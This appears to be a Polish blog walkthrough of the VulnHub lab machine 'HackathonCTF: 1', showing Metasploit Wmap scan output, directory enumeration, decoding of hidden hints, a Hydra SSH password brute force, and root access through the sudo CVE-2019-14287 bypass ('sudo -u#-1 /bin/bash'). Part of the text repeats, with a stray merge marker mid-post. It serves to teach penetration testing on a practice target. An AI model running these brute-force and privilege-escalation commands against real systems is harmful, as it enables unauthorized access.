---
title: "HackathonCTF: 1"
excerpt: " "
comments: true
categories:
  - Hacking
tags:
  - Hacking
  - Vulnhub
header:
  overlay_image: /assets/images/pasek-hack.png
---
# Wstęp
HackathonCTF:1 został stworzony (jak i dużo innych ciekawych obrazów) przez [somu sen](https://www.vulnhub.com/author/somu-sen,747/). W tej wirtualce Twoim zadaniem jest zdobycie roota (flag nie widziałem). Ten obraz jest naprawdę prosty i będziesz miał dużo frajdy, jeżeli sam to wszystko przejdziesz. Wirtualka jest na Ubuntu 14.04, więc ja na swoim XPC-NG nawet nie musiałem nic grzebać, żeby sieciówka się dobrze uruchomiła. Obraz ściągniesz [stąd](https://www.vulnhub.com/entry/hackathonctf-1,591/)
{: .text-justify}
## Moduły w Metasploicie
Zaczniemy od Metasploita. Przy okazji pokażę, jak się używa w nim modułów. Na tapetę, do celów do celów szkoleniowych weźmiemy moduł [Wmap](https://www.offensive-security.com/metasploit-unleashed/wmap-web-scanner/). Jest to skaner stron www. Niestety jest dość stary, ale to nie przeszkadza do pobieżnej analizy. Poniżej jest screen z komend, które wydałem:
{: .text-justify}
```bash
msf6 > load wmap

.-.-.-..-.-.-..---..---.
| | | || | | || | || |-'
`-----'`-'-'-'`-^-'`-'
[WMAP 1.5.1] ===  et [  ] metasploit.com 2012
[*] Successfully loaded plugin: wmap
msf6 > wmap_targets -t http://172.16.1.167
msf6 > wmap_run -t
[*] Testing target:
[*]     Site: 172.16.1.167 (172.16.1.167)
[*]     Port: 80 SSL: false
============================================================
[*] Testing started. 2021-07-27 18:45:45 +0200
[*] Loading wmap modules...
[*] 39 wmap enabled modules loaded.
[*]
=[ SSL testing ]=
============================================================
[*] Target is not SSL. SSL modules disabled.
[*]
=[ Web Server testing ]=
============================================================
[*] Module auxiliary/scanner/http/http_version
[*] Module auxiliary/scanner/http/open_proxy
[*] Module auxiliary/admin/http/tomcat_administration
[*] Module auxiliary/admin/http/tomcat_utf8_traversal
[*] Module auxiliary/scanner/http/drupal_views_user_enum
[*] Module auxiliary/scanner/http/frontpage_login
[*] Module auxiliary/scanner/http/host_header_injection
[*] Module auxiliary/scanner/http/options
[*] Module auxiliary/scanner/http/robots_txt
[*] Module auxiliary/scanner/http/scraper
[*] Module auxiliary/scanner/http/svn_scanner
[*] Module auxiliary/scanner/http/trace
[*] Module auxiliary/scanner/http/vhost_scanner
[*] Module auxiliary/scanner/http/webdav_internal_ip
[*] Module auxiliary/scanner/http/webdav_scanner
[*] Module auxiliary/scanner/http/webdav_website_content
[*]
=[ File/Dir testing ]=
============================================================
[*] Module auxiliary/scanner/http/backup_file
[*] Module auxiliary/scanner/http/brute_dirs
[*] Module auxiliary/scanner/http/copy_of_file
[*] Module auxiliary/scanner/http/dir_listing
[*] Module auxiliary/scanner/http/dir_scanner
[*] Module auxiliary/scanner/http/dir_webdav_unicode_bypass
[*] Module auxiliary/scanner/http/file_same_name_dir
[*] Module auxiliary/scanner/http/files_dir
[*] Module auxiliary/scanner/http/http_put
[*] Module auxiliary/scanner/http/ms09_020_webdav_unicode_bypass
[*] Module auxiliary/scanner/http/prev_dir_same_name_file
[*] Module auxiliary/scanner/http/replace_ext
[*] Module auxiliary/scanner/http/soap_xml
[*] Module auxiliary/scanner/http/trace_axd
[*] Module auxiliary/scanner/http/verb_auth_bypass
[*]
=[ Unique Query testing ]=
============================================================
[*] Module auxiliary/scanner/http/blind_sql_query
[*] Module auxiliary/scanner/http/error_sql_injection
[*] Module auxiliary/scanner/http/http_traversal
[*] Module auxiliary/scanner/http/rails_mass_assignment
[*] Module exploit/multi/http/lcms_php_exec
[*]
=[ Query testing ]=
============================================================
[*]
=[ General testing ]=
============================================================
[*] Done.
msf6 > wmap_sites -l
[*] Available sites
===============

     Id  Host          Vhost         Port  Proto  # Pages  # Forms
     --  ----          -----         ----  -----  -------  -------
     0   172.16.1.167  172.16.1.167  80    http   0        0


msf6 > wmap_run -e
[*] Using ALL wmap enabled modules.
[-] NO WMAP NODES DEFINED. Executing local modules
[*] Testing target:
[*]     Site: 172.16.1.167 (172.16.1.167)
[*]     Port: 80 SSL: false
============================================================
[*] Testing started. 2021-07-27 18:50:25 +0200
[*]
=[ SSL testing ]=
============================================================
[*] Target is not SSL. SSL modules disabled.
[*]
=[ Web Server testing ]=
============================================================
[*] Module auxiliary/scanner/http/http_version

[+] 172.16.1.167:80 Apache/2.4.7 (Ubuntu)
[*] Module auxiliary/scanner/http/open_proxy
[*] Module auxiliary/admin/http/tomcat_administration
[*] Module auxiliary/admin/http/tomcat_utf8_traversal
[*] Attempting to connect to 172.16.1.167:80
[+] No File(s) found
[*] Module auxiliary/scanner/http/drupal_views_user_enum
[-] 172.16.1.167 does not appear to be vulnerable, will not continue
[*] Module auxiliary/scanner/http/frontpage_login
[*] 172.16.1.167:80       - http://172.16.1.167/ may not support FrontPage Server Extensions
[*] Module auxiliary/scanner/http/host_header_injection
[*] Module auxiliary/scanner/http/options
[+] 172.16.1.167 allows OPTIONS,GET,HEAD,POST methods
[*] Module auxiliary/scanner/http/robots_txt
[*] [172.16.1.167] /robots.txt found
[+] Contents of Robots.txt:
user-agent: *
Disallow: /ctf


user-agent: *
Disallow: /ftc

user-agent: *
Disallow: /sudo













c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==



[*] Module auxiliary/scanner/http/scraper
[*] Module auxiliary/scanner/http/svn_scanner
[*] Using code '404' as not found.
[*] Module auxiliary/scanner/http/trace
[*] Module auxiliary/scanner/http/vhost_scanner
[*] [172.16.1.167] Sending request with random domain nramr.
[*] [172.16.1.167] Sending request with random domain XWEcj.
[*] Module auxiliary/scanner/http/webdav_internal_ip
[*] Module auxiliary/scanner/http/webdav_scanner
[*] 172.16.1.167 (Apache/2.4.7 (Ubuntu)) WebDAV disabled.
[*] Module auxiliary/scanner/http/webdav_website_content
[*]
=[ File/Dir testing ]=
============================================================
[*] Module auxiliary/scanner/http/backup_file
[*] Module auxiliary/scanner/http/brute_dirs
[*] Path: /
[*] Using code '404' as not found.
[*] Module auxiliary/scanner/http/copy_of_file
[*] Module auxiliary/scanner/http/dir_listing
[*] Path: /
[*] Module auxiliary/scanner/http/dir_scanner
[*] Path: /
[*] Detecting error code
[*] Using code '404' as not found for 172.16.1.167
[+] Found http://172.16.1.167:80/icons/ 404 (172.16.1.167)
[*] Module auxiliary/scanner/http/dir_webdav_unicode_bypass
[*] Path: /
[*] Using code '404' as not found.
[*] Module auxiliary/scanner/http/file_same_name_dir
[*] Path: /
[-] Blank or default PATH set.
[*] Module auxiliary/scanner/http/files_dir
[*] Path: /
[*] Using code '404' as not found for files with extension .null
[*] Using code '404' as not found for files with extension .backup
[*] Using code '404' as not found for files with extension .bak
[*] Using code '404' as not found for files with extension .c
[*] Using code '404' as not found for files with extension .cfg
[*] Using code '404' as not found for files with extension .class
[*] Using code '404' as not found for files with extension .copy
[*] Using code '404' as not found for files with extension .conf
[*] Using code '404' as not found for files with extension .exe
[*] Using code '404' as not found for files with extension .html
[+] Found http://172.16.1.167:80/index.html 200
[*] Using code '404' as not found for files with extension .htm
[*] Using code '404' as not found for files with extension .ini
[*] Using code '404' as not found for files with extension .log
[*] Using code '404' as not found for files with extension .old
[*] Using code '404' as not found for files with extension .orig
[*] Using code '404' as not found for files with extension .php
[*] Using code '404' as not found for files with extension .tar
[*] Using code '404' as not found for files with extension .tar.gz
[*] Using code '404' as not found for files with extension .tgz
[*] Using code '404' as not found for files with extension .tmp
[*] Using code '404' as not found for files with extension .temp
[*] Using code '404' as not found for files with extension .txt
[*] Using code '404' as not found for files with extension .zip
[*] Using code '404' as not found for files with extension ~
[*] Using code '404' as not found for files with extension
[*] Using code '404' as not found for files with extension
[*] Module auxiliary/scanner/http/http_put
[*] Path: /
[-] 172.16.1.167: File doesn't seem to exist. The upload probably failed
[*] Module auxiliary/scanner/http/ms09_020_webdav_unicode_bypass
[*] Path: /
[-] 172.16.1.167:80 Folder does not require authentication. [405]
[*] Module auxiliary/scanner/http/prev_dir_same_name_file
[*] Path: /
[-] Blank or default PATH set.
[*] Module auxiliary/scanner/http/replace_ext
[*] Module auxiliary/scanner/http/soap_xml
[*] Path: /
[*] Starting scan with 0ms delay between requests
[*] Server 172.16.1.167:80 returned HTTP 404 for /.  Use a different one.
[*] Module auxiliary/scanner/http/trace_axd
[*] Path: /
[*] Module auxiliary/scanner/http/verb_auth_bypass
[*]
=[ Unique Query testing ]=
============================================================
[*] Module auxiliary/scanner/http/blind_sql_query
[*] Module auxiliary/scanner/http/error_sql_injection
[*] Module auxiliary/scanner/http/http_traversal
[*] Module auxiliary/scanner/http/rails_mass_assignment
[*] Module exploit/multi/http/lcms_php_exec
[*]
=[ Query testing ]=
============================================================
[*]
=[ General testing ]=
============================================================
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Launch completed in 179.56159853935242 seconds.
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
[*] Done.
msf6 > wmap_vulns -l
[*] + [172.16.1.167] (172.16.1.167): directory /icons/
[*]     directory Directory found.
[*]     GET Res code: 403
[*] + [172.16.1.167] (172.16.1.167): file /index.html
[*]     file File found.
[*]     GET Res code: 404
msf6 >
```
Niestety, poza zakodowanym ciągiem w Base64 (**c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==**), nic ciekawego ten moduł nie znalazł. Działamy więc ręcznie. Po przeskanowaniu Nmap-em widzimy następujące otwarte porty. 
{: .text-justify}
Należy pamiętać o przełączniku **-p-**, ponieważ ssh jest na nietypowym porcie i szybkie skanowanie nam go nie znajdzie. Polecenie z Nmap-a zostawiam czytelnikowi.
{: .notice--danger}
```bash
host          port  proto  name    state  info
----          ----  -----  ----    -----  ----
172.16.1.167  21    tcp    ftp     open   vsftpd 3.0.2
172.16.1.167  23    tcp    telnet  open   Ubuntu 14.04 LTS\x0actf login:
172.16.1.167  80    tcp    http    open   Apache/2.4.7 (Ubuntu)
172.16.1.167  7223  tcp    ssh     open   OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 Ubuntu Linux; protocol 2.0
```
## Już bez Metasploita
Tradycyjnie zacznijmy od Http. Wchodzimy na stronę (u mnie 172.16.1.167) i widzimy komunikat, że nie ma strony. Jednak jeżeli się przyjrzycie, to jest fejk. Strona istnieje, tylko tak jest spreparowana, żeby wyglądało, że jej nie ma ;)
{: .text-justify}
Sprawdźmy szybko, czy są jakieś ukryte stronki:
```bash
dirb http://172.16.1.167/
```
Z ciekawszych rzeczy jest **http://172.16.1.167/robots.txt**. Poniżej zawartość:
=======
Tradycyjnie zacznijmy od analizy Http. Wchodzimy na stronę (u mnie 172.16.1.167) i widzimy komunikat, że nie ma strony. Jednak jeżeli się przyjrzycie, to jest to fejk. Strona istnieje, tylko jest tak spreparowana, żeby wyglądało, że jej nie ma ;)
{: .text-justify}
Sprawdźmy szybko, czy są jakieś ukryte stronki:
```bash
dirb http://172.16.1.167/
```
Z ciekawszych jest **http://172.16.1.167/robots.txt**.

Poniżej zawartość:
```
user-agent: *
Disallow: /ctf


user-agent: *
Disallow: /ftc

user-agent: *
Disallow: /sudo













c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==
```
Dirb nic więcej nie znalazł, jednak w **robots.txt** jest pewna wskazówka dotycząca plików, katalogów (ctf, ftc, sudo). Próba wejścia na http://172.16.1.167/sudo kończy się fiaskiem. Podobnie jest z ctf i ftc. Poszerzmy skanowanie pod kątem plików z rozszerzeniami: **txt,php,html,htm**:
```bash
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://172.16.1.167 -x php,txt,html,htm
```
Bingo, są strony:
```
http://172.16.1.167/sudo.html
http://172.16.1.167/ftc.html
```
W **sudo.html**  mamy *uname : test*

W **ftc.html** zaś jest taka ciekawa rzecz:
```
<!-- #117
#115
#101
#32
#114
#111
#99
#107
#121
#111
#117
#46
#116
#120
#116
-->
```
Zamieńmy skryptem to na przysępny tekst:
```bash
#!/bin/bash

tablica=(115 101 32 114 111 99 107 121 111 117 46 116 120 116)

for i in ${tablica[@]}; do
#echo $i
str1=$(printf "%x" $i)
string=$string""$str1
done

echo $string -n | xxd -r -p
```
Po rozkodowaniu wychodzi **se rockyou.txt**. 

Został nam do rozkodowania ciąg **c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==**, który jest w **robots.txt**. Tam zaś jest zakodowany ciąg w Base64. Po rozkodowaniu otrzymujemy **ssh-bruteforce-sudoit**
```bash
echo -n c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg== | base64 -d
```
Podsumowując mamy:
```
uname : test
se rockyou.txt
ssh-bruteforce-sudoit
```
Żeby się dostać na serwer ssh musimy użyć metody siłowej, używając słownika rockyou.txt. Do tego bardzo dobrze nadaje się Hydra. Przyznam, że na początku zmyliło mnie te początkowe **se** w **se rockyou.txt**. Ustawiłem szukanie metodą siłową słowa zaczynające się od **se**, jednak nic to nie dało. Więc zacząłem skanowanie od początku pliku **rockyou.txt**. Na szczęście nie trwało to długo, zwłaszcza, że w parametrach Hydry ustawiłem więcej wątków, niż jest standardowo. Skanowanie przebiegało szybciej.
{: .text-justify}
```bash
hydra -t 64 -l test -P /usr/share/wordlists/rockyou.txt ssh://172.16.1.167:7223 -V -I -f
[7223][ssh] host: 172.16.1.167   login: test   password: jordan23
ssh test@172.16.1.167 -p 7223
```
## Mamy Shella
Mam taki nawyk, że wchodząc na serwer od razu przeglądam historię. Tym razem to się przydało. Mamy parę ciekawych rzeczy:
{: .text-justify}
```
99  cat pass.txt
100  nano pass.txt
167  sudo -u#-1 /bin/bash
```
Widzimy jakiś plik i komendę z Sudo:
{: .text-justify}
```bash
test@ctf:~$ sudo -l
[sudo] password for test:
Matching Defaults entries for test on ctf:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User test may run the following commands on ctf:
    (ALL, !root) ALL
test@ctf:~$
```
**(ALL, !root) ALL** - to jest ciekawe.
## Podatność CVE 2019-14287
```bash
sudo -u#-1 /bin/bash
```
Ta komenda daje dostęp do root-a. Poszukałem trochę po necie i się dowiedziałem, że jest to podatność z CVE 2019-14287. Możesz o niej przeczytać [tutaj](https://www.exploit-db.com/exploits/47502). Przeglądając historię z konsoi, jeszcze widzimy plik **pass.txt**. Mając root-a szybko coś znajdziemy.
{: .text-justify}
```bash
root@ctf:~# find / -name pass.txt
/media/floppy0/media/imp/pass.txt
root@ctf:~#
```
Dekodujemy:
```bash
test@ctf:~$ echo Q1RGZGZyR0hZalVzU3NLS0AxMjM0NQo= | base64 -d
CTFdfrGHYjUsSsKK@12345
test@ctf:~$
```
Jest hasło, ale nie wiadomo do czego. ;) Potem się okazało, że się przydało do pliku /var/zip.rar. W pliku nic nie było.
{: .text-justify}
Podsumowując: Bardzo ciekawy i dosyć łatwy obraz do złamania. W sam raz dla początkujących.
{: .notice--success}
